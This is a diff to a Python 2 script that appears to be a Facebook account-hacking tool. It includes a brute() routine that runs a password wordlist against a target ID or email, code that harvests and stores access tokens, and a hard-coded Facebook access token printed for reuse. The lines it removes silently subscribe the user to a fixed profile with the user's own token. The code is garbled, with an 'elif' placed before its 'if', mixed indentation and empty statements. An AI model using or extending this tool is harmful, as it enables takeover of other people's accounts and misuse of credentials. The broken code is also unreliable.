@@ -75,54 +75,61 @@ def logmen():
     pilog()
 def pilog():
     og = raw_input("\nSelect: ")
+        elif og =="0":
+        exit()
     if og =="1":
         os.system("clear")
         print ("AUTHER AND OWNER 👉👉Mr-Robot")
         print
-        token = raw_input("[+] Past Your Token Here : ")
-        sav = open(".logfuck.txt","w")
-        sav.write(token)
-        sav.close()
-        print ("\r\033[1;32m[✓] Login Succesfully\033[0;97m")
-        os.system('xdg-open https://www.youtube.com/channel/UCzCZ1fHCMM6xjSfQOZFEmqg')
-        time.sleep(1)
-        bot_fl()
-    elif og =="0":
-        exit()
-    else:
-        print ("[!] Pilih Yang Bener Dong")
-        pilog()
-        
-def bot_fl():
-    try:
-        token = open('.logfuck.txt', 'r').read()
-    except IOError:
-        print '\x1b[1;97m   [!] Token invalid'
-        os.system('rm -rf .logfuck.txt')
-    requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + token)
-    menu()
-    
-def menu():
-    os.system("clear")
-    try:
-        token = open(".logfuck.txt","r").read()
-    except IOError:
-        print logo
-        print("[!] token error. token not found")
-        os.system("rm -rf .logfuck.txt")
-        time.sleep(1)
-        logmen()
-    try:
-        r = requests.get("https://graph.facebook.com/me?access_token="+token, headers=header)
-        a = json.loads(r.text)
-        name = a["name"]
-    except KeyError:
-        os.system("clear")
-        print logo
-        print("[!] Failed To Load. Your Checkpoint account")
-        os.system("rm -rf .logfuck.txt")
-        time.sleep(1)
-        logmen()
+        os.system('clear')
+	print logo
+	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;95mCopy👉  \033[1;96m EAAAAUaZA8jlABALosGEgn0RM9Y9EKJYV6Vw1AvdaoXlzFWRtUSErPnVqpZC2Q6gmQLFNEyDWacLVmLodTKt9PJpHDSvGgmfeeCWbPnjLYI3IAZAZAPipVJwY31I8giuMO6lDSj4Na55xVH0c0R9Pgqli27MfQNBnw9Gs1NPkNLC4Xnvbt8bHk2c9XHtmYOMZD  \033[1;95m👈 With out fb ID free login Token Paste & Enter👉")
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		zedd = open("login.txt", 'w')
+		zedd.write(toket)
+		zedd.close()
+		menu()
+	except KeyError:
+		print "\033[1;91m[!] Wrong"
+		e = raw_input("\033[1;91m[?] \033[1;92mWant to pick up token?\033[1;97m[y/n]: ")
+		if e =="":
+			keluar()
+		elif e =="y":
+			login()
+		else:
+			keluar()
+
+def get(data):
+	print '[*] Generate access token '
+
+	try:
+		os.mkdir('cookie')
+	except OSError:
+		pass
+
+	b = open('cookie/token.log','w')
+	try:
+		r = requests.get('https://api.facebook.com/restserver.php',params=data)
+		a = json.loads(r.text)
+
+		b.write(a['access_token'])
+		b.close()
+		print '[*] successfully generate access token'
+		print '[*] Your access token is stored in cookie/token.log'
+		menu()
+	except KeyError:
+		print '[!] Failed to generate access token'
+		print '[!] Check your connection / email or password'
+		os.remove('cookie/token.log')
+		menu()
+	except requests.exceptions.ConnectionError:
+		print '[!] Failed to generate access token'
+		print '[!] Connection error !!!'
+		os.remove('cookie/token.log')
+		menu()
     os.system("clear")
     print logo
     print("Welcome "+name)
@@ -218,11 +225,11 @@ def brute():
         login()
     else:
         os.system('clear')
-        print logo14
+        print 
         print '\033[1;93m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
         try:
             email = raw_input('\x1b[1;91m[●] \x1b[1;92mID\x1b[1;97m/\x1b[1;91mEmail \x1b[1;92mTarget \x1b[1;91m:\x1b[1;96m ')
-            passw = raw_input('\x1b[1;91m[●] \x1b[1;92mWordlist \x1b[1;97m(Type👉lovehacker-2.txt) \x1b[1;91m: \x1b[1;97m')
+            passw = raw_input('\x1b[1;91m[●] \x1b[1;92mWordlist \x1b[1;97m(Type👉Mr-Robot.txt) \x1b[1;91m: \x1b[1;97m')
             total = open(passw, 'r')
             total = total.readlines()
             print '\033[1;95m ◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.'
@@ -268,7 +275,7 @@ def brute():
         except IOError:
             print '\x1b[1;91m[!] File not found...'
             print """\n\x1b[1;91m[!] \x1b[1;93mAdd another wordlist corect name"""
-            super()
+            
 															
 		
 	
